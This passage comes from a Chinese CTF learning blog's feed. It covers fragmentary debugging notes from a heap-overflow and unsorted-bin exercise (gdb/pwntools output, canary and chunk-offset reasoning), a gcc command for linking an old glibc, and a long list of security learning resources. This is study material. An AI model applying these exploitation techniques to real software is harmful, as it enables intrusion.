class=&#34;meta&#34;&gt;#print(io.recv(1024))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		你得理清楚哪里需要用b哪里不需要&lt;/p&gt;
&lt;p&gt;和libc版本有关吗?  感觉应该没问题了的,但是打不了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x6033d0&lt;/span&gt;:       &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x000003b1&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;\n&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;       │&lt;span class=&#34;number&#34;&gt;00000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Paused│&lt;span class=&#34;number&#34;&gt;0x6033e0&lt;/span&gt;:       &lt;span class=&#34;number&#34;&gt;0x61616161&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x0000000a&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; (press an│&lt;span class=&#34;number&#34;&gt;00000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;y to conti│&lt;span class=&#34;number&#34;&gt;0x6033f0&lt;/span&gt;:       &lt;span class=&#34;number&#34;&gt;0x0000000a&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0x000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nue)      │&lt;span class=&#34;number&#34;&gt;00000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x400bb8&lt;/span&gt;    call   &lt;span class=&#34;number&#34;&gt;0x400a14&lt;/span&gt;                      &amp;lt;&lt;span class=&#34;number&#34;&gt;0x400a14&lt;/span&gt;&amp;gt; input the note index to edit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sh.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)                   │&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[DEBUG] Sent &lt;span class=&#34;number&#34;&gt;0x2&lt;/span&gt; bytes:              │ ► &lt;span class=&#34;number&#34;&gt;0x400bbd&lt;/span&gt;    jmp    &lt;span class=&#34;number&#34;&gt;0x400bca&lt;/span&gt;                      &amp;lt;&lt;span class=&#34;number&#34;&gt;0x400bca&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		看了一下申请的chunk大小不正常,怀疑是发送过去的数据有问题,恩,sendline有问题&lt;/p&gt;
&lt;p&gt;mov    rax, qword ptr fs:[0x28]  这个是canary吧&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/counsellor/article/details/81005101&#34;&gt;https://blog.csdn.net/counsellor/article/details/81005101&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;addr &amp;#x3D; 0x06020D4 - 0x10 为啥要-0x10呢??         因为是要得到chunk的头吧,不是数据头&lt;/p&gt;
&lt;p&gt;怎么负数了… addr &amp;#x3D; 0x06020D4 - 0x12 多减点值,让它覆盖的时候能覆盖上就可以了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/image-20230601102322660.png&#34; alt=&#34;image-20230601102322660&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;gdb-pwntools调试&#34;&gt;&lt;a href=&#34;#gdb-pwntools调试&#34; class=&#34;headerlink&#34; title=&#34;gdb + pwntools调试&#34;&gt;&lt;/a&gt;gdb + pwntools调试&lt;/h2&gt;</content>
        <category term="PWN入门" />
        <updated>2023-02-24T02:06:55.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</id>
        <title>pwn入门-遇到的奇奇怪怪的问题及解决办法</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
        <content type="html">&lt;p&gt;gcc -Wl,-rpath&amp;#x3D;&amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu3_amd64&amp;#x2F;&amp;#x2F;,–dynamic-linker&amp;#x3D;&amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;glibc-all-in-one&amp;#x2F;libs&amp;#x2F;2.23-0ubuntu3_amd64&amp;#x2F;ld-linux-x86-64.so.2 1.c&lt;/p&gt;
&lt;p&gt;&amp;#x3D;&amp;gt; 0x563e8cd58c31 &amp;lt;main+395&amp;gt;:	lea    rdi,[rip+0xbd5]        # 0x563e8cd5980d&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/image-20230319232227418.png&#34; alt=&#34;image-20230319232227418&#34;&gt;&lt;/p&gt;
</content>
        <updated>2023-02-19T03:17:23.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-0-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E5%8F%8A%E5%A4%87%E5%BF%98%E4%BB%93%E5%BA%93/</id>
        <title>pwn入门-0-学习资源及备忘仓库</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-0-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E5%8F%8A%E5%A4%87%E5%BF%98%E4%BB%93%E5%BA%93/"/>
        <content type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&#34;每日可看&#34;&gt;&lt;a href=&#34;#每日可看&#34; class=&#34;headerlink&#34; title=&#34;每日可看&#34;&gt;&lt;/a&gt;每日可看&lt;/h1&gt;&lt;p&gt;玄武实验室  sec.today&lt;/p&gt;
&lt;p&gt;安全研究 GoSSIP 公众号每日推送&lt;/p&gt;
&lt;p&gt;吾爱破解 &lt;a href=&#34;https://www.52pojie.cn/&#34;&gt;https://www.52pojie.cn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;看雪论坛 &lt;a href=&#34;https://bbs.kanxue.com/&#34;&gt;https://bbs.kanxue.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;v2ex 分享探索 社区 &lt;a href=&#34;https://www.v2ex.com/&#34;&gt;https://www.v2ex.com&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;资源整合和学习路径&#34;&gt;&lt;a href=&#34;#资源整合和学习路径&#34; class=&#34;headerlink&#34; title=&#34;资源整合和学习路径&#34;&gt;&lt;/a&gt;资源整合和学习路径&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://csdiy.wiki/&#34;&gt;https://csdiy.wiki/&lt;/a&gt; 北大学生总结的自学指南,非常好,融合了许多优质的公开课程和书籍&lt;/p&gt;
&lt;h1 id=&#34;最近待看&#34;&gt;&lt;a href=&#34;#最近待看&#34; class=&#34;headerlink&#34; title=&#34;最近待看&#34;&gt;&lt;/a&gt;最近待看&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/firmianay/CTF-All-In-One/tree/master&#34;&gt;https://github.com/firmianay/CTF-All-In-One/tree/master&lt;/a&gt; 感觉作者有添加一些新的东西(相比那本书)&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://seedsecuritylabs.org/instructor_manual.html&#34;&gt;https://seedsecuritylabs.org/instructor_manual.html&lt;/a&gt; seedlab&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://nju-projectn.github.io/ics-pa-gitbook/ics2021/&#34;&gt;https://nju-projectn.github.io/ics-pa-gitbook/ics2021/&lt;/a&gt; 南大计算机基础实验&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.hackdig.com/&#34;&gt;http://www.hackdig.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.bookstack.cn/read/webxiaohua-gitbook/README.md&#34;&gt;https://www.bookstack.cn/read/webxiaohua-gitbook/README.md&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hacklido.com/&#34;&gt;https://hacklido.com/&lt;/a&gt; 一个国外的网站, 有篇很励志的文章&lt;a href=&#34;https://hacklido.com/blog/439-how-i-got-my-oscp-at-16-years-old&#34;&gt;https://hacklido.com/blog/439-how-i-got-my-oscp-at-16-years-old&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hsqstephenzhang.github.io/2022/02/10/linux/syscall/vdso/&#34;&gt;https://hsqstephenzhang.github.io/2022/02/10/linux/syscall/vdso/&lt;/a&gt;  腾讯云容器团队的一个老哥的博客,感觉挺有意思&lt;/p&gt;
&lt;p&gt;北理工那个团队网站 &lt;a href=&#34;https://www.isclab.org.cn/&#34;&gt;https://www.isclab.org.cn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ooopn.com/&#34;&gt;https://www.ooopn.com&lt;/a&gt; 一个工具网站&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-218617.htm&#34;&gt;https://bbs.kanxue.com/thread-218617.htm&lt;/a&gt; 看雪 个人博客&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hnusec.github.io/#/Stuff&#34;&gt;https://hnusec.github.io/#/Stuff&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;国际知名战队的博客等&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://defcon.org/html/defcon-29/dc-29-speakers.html#fournier&#34;&gt;https://defcon.org/html/defcon-29/dc-29-speakers.html#fournier&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/Breeze_CAT/article/details/103788631&#34;&gt;https://blog.csdn.net/Breeze_CAT/article/details/103788631&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://wizardforcel.gitbooks.io/100-gdb-tips/content/call-func.html&#34;&gt;https://wizardforcel.gitbooks.io/100-gdb-tips/content/call-func.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.52pojie.cn/thread-1399142-1-1.html&#34;&gt;https://www.52pojie.cn/thread-1399142-1-1.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hack1s.fun/page/2/&#34;&gt;https://hack1s.fun/page/2/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://javabin.cn/&#34;&gt;http://javabin.cn&lt;/a&gt; 一个搞物联网的,感觉挺有意思&lt;/p&gt;
&lt;h1 id=&#34;问题&#34;&gt;&lt;a href=&#34;#问题&#34; class=&#34;headerlink&#34; title=&#34;问题&#34;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;p&gt;libc.so.6怎么用?&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/Taolaw/p/16281185.html&#34;&gt;https://www.cnblogs.com/Taolaw/p/16281185.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Glibc,libc gcc工作原理了解清楚&lt;/p&gt;
&lt;h1 id=&#34;学习资源&#34;&gt;&lt;a href=&#34;#学习资源&#34; class=&#34;headerlink&#34; title=&#34;学习资源&#34;&gt;&lt;/a&gt;学习资源&lt;/h1&gt;&lt;h2 id=&#34;安全会议&#34;&gt;&lt;a href=&#34;#安全会议&#34; class=&#34;headerlink&#34; title=&#34;安全会议&#34;&gt;&lt;/a&gt;安全会议&lt;/h2&gt;&lt;p&gt;四大顶会&lt;/p&gt;
&lt;p&gt;blackhat &lt;a href=&#34;https://www.blackhat.com/&#34;&gt;https://www.blackhat.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.blackhat.com/latestintel/&#34;&gt;https://www.blackhat.com/latestintel/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.blackhat.com/html/archives.html&#34;&gt;https://www.blackhat.com/html/archives.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;安全社区-可以没事多逛逛&#34;&gt;&lt;a href=&#34;#安全社区-可以没事多逛逛&#34; class=&#34;headerlink&#34; title=&#34;安全社区(可以没事多逛逛)&#34;&gt;&lt;/a&gt;安全社区(可以没事多逛逛)&lt;/h2&gt;&lt;p&gt;玄武实验室  sec.today&lt;/p&gt;
&lt;p&gt;吾爱破解 &lt;a href=&#34;https://www.52pojie.cn/&#34;&gt;https://www.52pojie.cn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;看雪论坛 &lt;a href=&#34;https://bbs.kanxue.com/&#34;&gt;https://bbs.kanxue.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;v2ex 分享探索 社区 &lt;a href=&#34;https://www.v2ex.com/&#34;&gt;https://www.v2ex.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ctfiot.com/&#34;&gt;https://www.ctfiot.com&lt;/a&gt;  chamd5的! 一个综合信息平台&lt;/p&gt;
&lt;h2 id=&#34;学习网站&#34;&gt;&lt;a href=&#34;#学习网站&#34; class=&#34;headerlink&#34; title=&#34;学习网站&#34;&gt;&lt;/a&gt;学习网站&lt;/h2&gt;&lt;p&gt;CTFwiki（入门必看wiki）: &lt;a href=&#34;https://ctf-wiki.github.io/ctf-wiki/#/introduction&#34;&gt;https://ctf-wiki.github.io/ctf-wiki/#/introduction&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ctftime     ctf各个比赛日程,很权威&lt;/p&gt;
&lt;p&gt;buuctf   &lt;a href=&#34;https://buuoj.cn/&#34;&gt;https://buuoj.cn/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ctfshow &lt;a href=&#34;https://ctf.show/challenges&#34;&gt;https://ctf.show/challenges&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ctfhub&lt;/p&gt;
&lt;p&gt;CTFrank: &lt;a href=&#34;https://ctfrank.org/&#34;&gt;https://ctfrank.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;攻防世界  xctf官方: &lt;a href=&#34;https://time.xctf.org.cn/&#34;&gt;https://time.xctf.org.cn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;i春秋   &lt;a href=&#34;https://www.ichunqiu.com/competition&#34;&gt;https://www.ichunqiu.com/competition&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.wechall.net/active_sites&#34;&gt;http://www.wechall.net/active_sites&lt;/a&gt;  一个ctf网站，同时也收录了很多学习网站&lt;/p&gt;
&lt;p&gt;Tryhackme\hackthebox\&lt;/p&gt;
&lt;h3 id=&#34;pwn专属&#34;&gt;&lt;a href=&#34;#pwn专属&#34; class=&#34;headerlink&#34; title=&#34;pwn专属&#34;&gt;&lt;/a&gt;pwn专属&lt;/h3&gt;&lt;p&gt;pwn.college   由浅入深,一步一步,还有机器可以用!&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://pwnable.kr/&#34;&gt;https://pwnable.kr&lt;/a&gt;            &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://pwnable.tw/&#34;&gt;http://pwnable.tw&lt;/a&gt;            &lt;/p&gt;
&lt;h2 id=&#34;重要比赛&#34;&gt;&lt;a href=&#34;#重要比赛&#34; class=&#34;headerlink&#34; title=&#34;重要比赛&#34;&gt;&lt;/a&gt;重要比赛&lt;/h2&gt;&lt;p&gt;defcon &lt;a href=&#34;https://defcon.org/html/defcon-30/dc-30-training.html&#34;&gt;https://defcon.org/html/defcon-30/dc-30-training.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;书籍&#34;&gt;&lt;a href=&#34;#书籍&#34; class=&#34;headerlink&#34; title=&#34;书籍&#34;&gt;&lt;/a&gt;书籍&lt;/h2&gt;&lt;p&gt;《计算机安全导论：深度实践 (杜文亮) 》 很适合入门,讲的非常详细&lt;/p&gt;
&lt;p&gt;《从0到1，CTFer的成长之路》&lt;/p&gt;
&lt;p&gt;《CTF权威指南-PWN篇》&lt;/p&gt;
&lt;h2 id=&#34;大佬博客&#34;&gt;&lt;a href=&#34;#大佬博客&#34; class=&#34;headerlink&#34; title=&#34;大佬博客&#34;&gt;&lt;/a&gt;大佬博客&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://xuanxuanblingbling.github.io/&#34;&gt;https://xuanxuanblingbling.github.io&lt;/a&gt;       xuanxuan和他对象的,记录了从小白到大神的一路,感觉写得非常好!&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blingblingxuanxuan.github.io/&#34;&gt;https://blingblingxuanxuan.github.io&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hurricane618.me/&#34;&gt;https://hurricane618.me&lt;/a&gt; IIE学长的博客,有写自己的心路历程,感觉很不错,能从中看到一个人的成长 &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://kiprey.github.io/&#34;&gt;https://kiprey.github.io&lt;/a&gt;       清华网安硕士在读,博客深入浅出,良好的学习路线&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_45209963?type=blog&#34;&gt;https://blog.csdn.net/weixin_45209963?type=blog&lt;/a&gt; 天大pwn老哥的博客&lt;/p&gt;
&lt;p&gt;计算机底层的秘密 &lt;a href=&#34;https://github.com/webxiaohua/gitbook/blob/master/SUMMARY.md&#34;&gt;https://github.com/webxiaohua/gitbook/blob/master/SUMMARY.md&lt;/a&gt; 这个合集不错&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html&#34;&gt;http://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://bestwing.me/archives/page/14/&#34;&gt;https://bestwing.me/archives/page/14/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://etenal.me/archives/1121&#34;&gt;https://etenal.me/archives/1121&lt;/a&gt; 待看,这个也不错,这一篇是堆的&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://blog.imv1.me/&#34;&gt;http://blog.imv1.me&lt;/a&gt;  NeSE搞内核安全的大佬学长&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://eqqie.cn/&#34;&gt;https://eqqie.cn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/kiprey/skr_Learning&#34;&gt;https://github.com/kiprey/skr_Learning&lt;/a&gt; 一个非常不错的成长路线(每周更新),可以参考,&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cjting.me/&#34;&gt;https://cjting.me&lt;/a&gt;  做的一些很深入的小研究,治愈系&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://trailofbits.github.io/ctf/&#34;&gt;https://trailofbits.github.io/ctf/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://link.zhihu.com/?target=https://security.ntu.st/&#34;&gt;https://security.ntu.st/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/BrieflyX/ctf-pwns&#34;&gt;https://github.com/BrieflyX/ctf-pwns&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;Atum&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hpdoger.cn/about/&#34;&gt;https://hpdoger.cn/about/&lt;/a&gt; 又一个学长的博客&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://trailofbits.github.io/ctf/&#34;&gt;https://trailofbits.github.io/ctf/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://link.zhihu.com/?target=https://security.ntu.st/&#34;&gt;https://security.ntu.st/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://etenal.me/archives/972#C1&#34;&gt;https://etenal.me/archives/972#C1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/BrieflyX/ctf-pwns&#34;&gt;https://github.com/BrieflyX/ctf-pwns&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://y4er.com/&#34;&gt;https://y4er.com&lt;/a&gt; web&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.flanker017.me/&#34;&gt;https://blog.flanker017.me&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Eastmount（csdn）、娜璋ai安全之家（公众号）：博士在读，研究AI、网络安全   &lt;a href=&#34;https://blog.csdn.net/Eastmount&#34;&gt;https://blog.csdn.net/Eastmount&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://shell-storm.org/&#34;&gt;http://shell-storm.org&lt;/a&gt; 国外大佬，还有很多shellcode样本[&lt;a href=&#34;http://shell-storm.org/shellcode/]&#34;&gt;http://shell-storm.org/shellcode/]&lt;/a&gt;(&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;http://scz.617.cn:8/&#34;&gt;http://scz.617.cn:8&lt;/a&gt;   不知道是哪个大佬.. &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://showlinkroom.me/&#34;&gt;http://showlinkroom.me&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://eternalsakura13.com/&#34;&gt;https://eternalsakura13.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://kiprey.github.io/&#34;&gt;https://kiprey.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://blog.eonew.cn/&#34;&gt;http://blog.eonew.cn/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://ruanyifeng.com/blog/2018/02/docker-tutorial.html&#34;&gt;http://ruanyifeng.com/blog/2018/02/docker-tutorial.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://thiscute.world/&#34;&gt;https://thiscute.world/&lt;/a&gt; 最近发现的两个计算机的大佬,在v2ex中发现的&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://soulteary.com/&#34;&gt;https://soulteary.com&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;0xffff社区&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://0xffff.one/d/1085-mit6-s081-operating-system&#34;&gt;https://0xffff.one/d/1085-mit6-s081-operating-system&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;CTF知名战队网站&#34;&gt;&lt;a href=&#34;#CTF知名战队网站&#34; class=&#34;headerlink&#34; title=&#34;CTF知名战队网站&#34;&gt;&lt;/a&gt;CTF知名战队网站&lt;/h2&gt;&lt;p&gt;国科大-NeSE:&lt;a href=&#34;https://nese.team/&#34;&gt;https://nese.team&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;清华:&lt;a href=&#34;https://redbud.info/&#34;&gt;https://redbud.info&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;复旦白泽战队:知乎、微信公众号&lt;/p&gt;
&lt;p&gt;X1cT34m: &lt;a href=&#34;https://ctf.njupt.edu.cn/&#34;&gt;https://ctf.njupt.edu.cn&lt;/a&gt;   &lt;/p&gt;
&lt;p&gt;SU:&lt;a href=&#34;https://team-su.github.io/&#34;&gt;https://team-su.github.io&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;星盟:&lt;a href=&#34;https://space.bilibili.com/489643272&#34;&gt;https://space.bilibili.com/489643272&lt;/a&gt; 有ctf培训课程 pwn已完结 、 微信公众号:星盟安全&lt;/p&gt;
&lt;p&gt;天璇Merak: 微信公众号,有一些文章,更新较少&lt;/p&gt;
&lt;p&gt;星盟  &lt;a href=&#34;http://blog.xmcve.com/&#34;&gt;http://blog.xmcve.com&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞挖掘-x2F-分析工具&#34;&gt;&lt;a href=&#34;#漏洞挖掘-x2F-分析工具&#34; class=&#34;headerlink&#34; title=&#34;漏洞挖掘&amp;#x2F;分析工具&#34;&gt;&lt;/a&gt;漏洞挖掘&amp;#x2F;分析工具&lt;/h2&gt;&lt;p&gt;angr&lt;/p&gt;
&lt;h2 id=&#34;一些小工具&#34;&gt;&lt;a href=&#34;#一些小工具&#34; class=&#34;headerlink&#34; title=&#34;一些小工具:&#34;&gt;&lt;/a&gt;一些小工具:&lt;/h2&gt;&lt;p&gt;Compiler Explorer   在线应用层代码转汇编&lt;/p&gt;
&lt;p&gt;在线运行汇编 &lt;a href=&#34;https://www.tutorialspoint.com/compile_assembly_online.php&#34;&gt;https://www.tutorialspoint.com/compile_assembly_online.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.textcompare.org/&#34;&gt;https://www.textcompare.org&lt;/a&gt; diff网站,比较各种内容的不同&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;https://gchq.github.io/CyberChef/&lt;/a&gt; 解密解码工具&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cloudconvert.com/&#34;&gt;https://cloudconvert.com&lt;/a&gt; 在线格式转换&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://web.archive.org/&#34;&gt;https://web.archive.org&lt;/a&gt; 查看历史网站记录 &lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cloudconvert.com/&#34;&gt;https://cloudconvert.com&lt;/a&gt;  各种文件的格式转换&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ilovepdf.com/&#34;&gt;https://www.ilovepdf.com&lt;/a&gt;  pdf操作，切割等&lt;/p&gt;
&lt;h3 id=&#34;ctf导航&#34;&gt;&lt;a href=&#34;#ctf导航&#34; class=&#34;headerlink&#34; title=&#34;ctf导航&#34;&gt;&lt;/a&gt;ctf导航&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;http://www.ctfiot.com/&#34;&gt;http://www.ctfiot.com&lt;/a&gt;. ChaMd5团队做的&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ctf.mzy0.com/&#34;&gt;https://ctf.mzy0.com&lt;/a&gt;&lt;/p&gt;
